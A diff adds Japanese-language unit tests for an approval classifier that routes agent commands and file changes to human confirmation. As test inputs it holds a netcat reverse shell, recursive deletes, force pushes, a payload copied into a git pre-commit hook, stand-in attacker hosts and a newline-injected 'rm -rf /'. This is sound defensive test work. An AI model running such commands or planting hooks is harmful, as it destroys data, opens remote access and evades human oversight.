@@ -349,6 +349,24 @@ describe('classifyApprovalRequest: .gitディレクトリ', () => {
     );
     expect(result.decision).toBe('ask');
   });
+
+  it('.gitの大文字小文字が違っても（.GIT）askになる。macOS既定のAPFSは大文字小文字を区別しないため', () => {
+    const result = classifyApprovalRequest(
+      fileChangeRequest(['/repo/work/.GIT/hooks/pre-commit']),
+      defaultBoundary(),
+      policy(),
+    );
+    expect(result.decision).toBe('ask');
+  });
+
+  it('.gitの大文字小文字が混在していても（.Git）askになる', () => {
+    const result = classifyApprovalRequest(
+      fileChangeRequest(['/repo/work/.Git/hooks/pre-commit']),
+      defaultBoundary(),
+      policy(),
+    );
+    expect(result.decision).toBe('ask');
+  });
 });
 
 describe('classifyApprovalRequest: permissions種別', () => {
@@ -392,6 +410,110 @@ describe('classifyApprovalRequest: コマンド文字列の欠落（判定に失
       policy({ allow: Object.values(DANGER_PATTERN_IDS) }),
     );
     expect(result.decision).toBe('ask');
+  });
+
+  it('fileChangeでpathsが空配列のときはaskになる（実行層がitemIdからのパス解決を実装し忘れた場合の保険）', () => {
+    const result = classifyApprovalRequest(fileChangeRequest([]), defaultBoundary(), policy());
+    expect(result.decision).toBe('ask');
+  });
+
+  it('allowを指定してもfileChangeのpaths空配列はaskのまま', () => {
+    const result = classifyApprovalRequest(
+      fileChangeRequest([]),
+      defaultBoundary(),
+      policy({ allow: Object.values(DANGER_PATTERN_IDS) }),
+    );
+    expect(result.decision).toBe('ask');
+  });
+});
+
+describe('classifyApprovalRequest: 大文字小文字を問わない判定', () => {
+  it.each([
+    ['再帰的な強制削除（全て大文字）', 'RM -RF /repo/work/tmp'],
+    ['再帰的な強制削除（混在）', 'Rm -Rf /repo/work/tmp'],
+    ['git cleanの強制実行（大文字）', 'GIT CLEAN -FD'],
+    ['作業ツリーの強制巻き戻し（大文字）', 'GIT RESET --HARD HEAD'],
+    ['git checkout -f（大文字）', 'GIT CHECKOUT -F main'],
+    ['ブランチの削除（大文字）', 'GIT BRANCH -D old-feature'],
+    ['タグの削除（大文字）', 'GIT TAG -D v1.0.0'],
+    ['リモートブランチの削除push（大文字）', 'GIT PUSH ORIGIN --DELETE old-branch'],
+    ['テーブルの削除（大文字、既存互換）', 'PSQL -C "DROP TABLE users"'],
+    ['find -delete（大文字）', 'FIND . -NAME *.TMP -DELETE'],
+    ['強制push（大文字）', 'GIT PUSH --FORCE origin main'],
+    ['デプロイ・パッケージ公開（大文字、既存互換）', 'NPM PUBLISH --ACCESS public'],
+    ['外部到達curl（大文字）', 'CURL https://example.com/x'],
+    ['外部到達wget（大文字）', 'WGET https://example.com/x'],
+    ['外部到達nc（大文字）', 'NC -e /bin/sh 10.0.0.1 4444'],
+    ['base64デコード（大文字）', 'BASE64 -D encoded.txt -o out.bin'],
+    ['xxdデコード（大文字）', 'XXD -R hex.txt out.bin'],
+  ])('%s はaskになる: %s', (_label, command) => {
+    const result = classifyApprovalRequest(commandRequest(command), defaultBoundary(), policy());
+    expect(result.decision).toBe('ask');
+  });
+});
+
+describe('classifyApprovalRequest: コマンド引数中のパス', () => {
+  it('絶対パスの引数で.git配下に書き込む場合はaskになる', () => {
+    const result = classifyApprovalRequest(
+      commandRequest('cp /repo/work/payload.sh /repo/work/.git/hooks/pre-commit', '/repo/work'),
+      defaultBoundary(),
+      policy(),
+    );
+    expect(result.decision).toBe('ask');
+  });
+
+  it('cwd相対の引数で.git配下に書き込む場合もaskになる', () => {
+    const result = classifyApprovalRequest(
+      commandRequest('cp payload.sh .git/hooks/pre-commit', '/repo/work'),
+      defaultBoundary(),
+      policy(),
+    );
+    expect(result.decision).toBe('ask');
+  });
+
+  it('cwdが不明でも.gitセグメントを含む引数はaskになる（解決不能時のフォールバック）', () => {
+    const result = classifyApprovalRequest(
+      commandRequest('cp payload.sh .git/hooks/pre-commit', ''),
+      defaultBoundary(),
+      policy(),
+    );
+    expect(result.decision).toBe('ask');
+  });
+
+  it('フラグの対象になっている絶対パスの引数もaskになる（chmod）', () => {
+    const result = classifyApprovalRequest(
+      commandRequest('chmod +x /repo/work/.git/hooks/pre-commit', '/repo/work'),
+      defaultBoundary(),
+      policy(),
+    );
+    expect(result.decision).toBe('ask');
+  });
+
+  it('引数の絶対パスが境界外を指す場合はaskになる（cp）', () => {
+    const result = classifyApprovalRequest(
+      commandRequest('cp /repo/work/data.txt /tmp/other/exfil.txt', '/repo/work'),
+      defaultBoundary(),
+      policy(),
+    );
+    expect(result.decision).toBe('ask');
+  });
+
+  it('引数の絶対パスが境界外を指す場合はaskになる（tar -C）', () => {
+    const result = classifyApprovalRequest(
+      commandRequest('tar -C /tmp/other -xf archive.tar', '/repo/work'),
+      defaultBoundary(),
+      policy(),
+    );
+    expect(result.decision).toBe('ask');
+  });
+
+  it('引数のパスが境界内・.git配下でもなければautoのまま（過検知しない）', () => {
+    const result = classifyApprovalRequest(
+      commandRequest('cp /repo/work/data.txt /repo/work/backup/data.txt', '/repo/work'),
+      defaultBoundary(),
+      policy(),
+    );
+    expect(result.decision).toBe('auto');
   });
 });
 
@@ -520,6 +642,94 @@ describe('classifyApprovalRequest: proposedExecpolicyAmendment（以後の無確
       policy(),
     );
     expect(result.decision).toBe('auto');
+  });
+});
+
+describe('classifyApprovalRequest: escalateの照合対象（構造化フィールドを含む）', () => {
+  it('networkApprovalContext.hostがコマンド文字列に現れなくてもescalateで拾える', () => {
+    const result = classifyApprovalRequest(
+      commandRequest('sync-tool run', '', {
+        networkApprovalContext: { host: 'attacker.example', protocol: 'https' },
+      }),
+      defaultBoundary(),
+      // externalEgressを解除しても、escalateがhostそのものに反応してaskへ戻ることを見る
+      policy({ allow: [DANGER_PATTERN_IDS.externalEgress], escalate: ['attacker.example'] }),
+    );
+    expect(result.decision).toBe('ask');
+    expect(result.reasons.some((r) => r.includes('escalateで指定されたパターン'))).toBe(true);
+  });
+
+  it('proposedNetworkPolicyAmendments[].hostもescalateの照合対象になる', () => {
+    const result = classifyApprovalRequest(
+      commandRequest('sync-tool run', '', {
+        proposedNetworkPolicyAmendments: [{ action: 'deny', host: 'watched.example' }],
+      }),
+      defaultBoundary(),
+      policy({ escalate: ['watched.example'] }),
+    );
+    expect(result.decision).toBe('ask');
+    expect(result.reasons.some((r) => r.includes('escalateで指定されたパターン'))).toBe(true);
+  });
+
+  it('grantRootもescalateの照合対象になる（grantRoot自体が既にaskを強制するが、escalateも独立して一致する）', () => {
+    const result = classifyApprovalRequest(
+      fileChangeRequest(['/repo/work/src/file.ts'], '/repo/work/sensitive-root'),
+      defaultBoundary(),
+      policy({ escalate: ['sensitive-root'] }),
+    );
+    expect(result.decision).toBe('ask');
+    expect(result.reasons.some((r) => r.includes('セッション残り全体'))).toBe(true);
+    expect(result.reasons.some((r) => r.includes('escalateで指定されたパターン'))).toBe(true);
+  });
+
+  it('proposedExecpolicyAmendmentもescalateの照合対象になる', () => {
+    const result = classifyApprovalRequest(
+      commandRequest('npm test', '/repo/work', {
+        proposedExecpolicyAmendment: ['unique-marker-xyz'],
+      }),
+      defaultBoundary(),
+      policy({ escalate: ['unique-marker-xyz'] }),
+    );
+    expect(result.decision).toBe('ask');
+    expect(result.reasons.some((r) => r.includes('以後同種のコマンド'))).toBe(true);
+    expect(result.reasons.some((r) => r.includes('escalateで指定されたパターン'))).toBe(true);
+  });
+});
+
+describe('classifyApprovalRequest: 理由文字列の無害化', () => {
+  it('grantRootに含まれる改行は理由に持ち込まれない', () => {
+    const result = classifyApprovalRequest(
+      fileChangeRequest(['/repo/work/src/file.ts'], '/repo/work\n偽の行\nrm -rf /'),
+      defaultBoundary(),
+      policy(),
+    );
+    expect(result.decision).toBe('ask');
+    expect(result.reasons.every((r) => !r.includes('\n'))).toBe(true);
+  });
+
+  it('長すぎる値は一定長で省略される', () => {
+    const longRoot = `/repo/work/${'a'.repeat(500)}`;
+    const result = classifyApprovalRequest(
+      fileChangeRequest(['/repo/work/src/file.ts'], longRoot),
+      defaultBoundary(),
+      policy(),
+    );
+    const reason = result.reasons.find((r) => r.includes('セッション残り全体')) ?? '';
+    expect(reason).not.toBe('');
+    expect(reason.length).toBeLessThan(longRoot.length);
+    expect(reason.includes('…')).toBe(true);
+  });
+
+  it('外部到達先のhostに改行が含まれても理由に持ち込まれない', () => {
+    const result = classifyApprovalRequest(
+      commandRequest('sync-tool run', '', {
+        networkApprovalContext: { host: 'evil.example\n偽の行', protocol: 'https' },
+      }),
+      defaultBoundary(),
+      policy(),
+    );
+    expect(result.decision).toBe('ask');
+    expect(result.reasons.every((r) => !r.includes('\n'))).toBe(true);
   });
 });
 
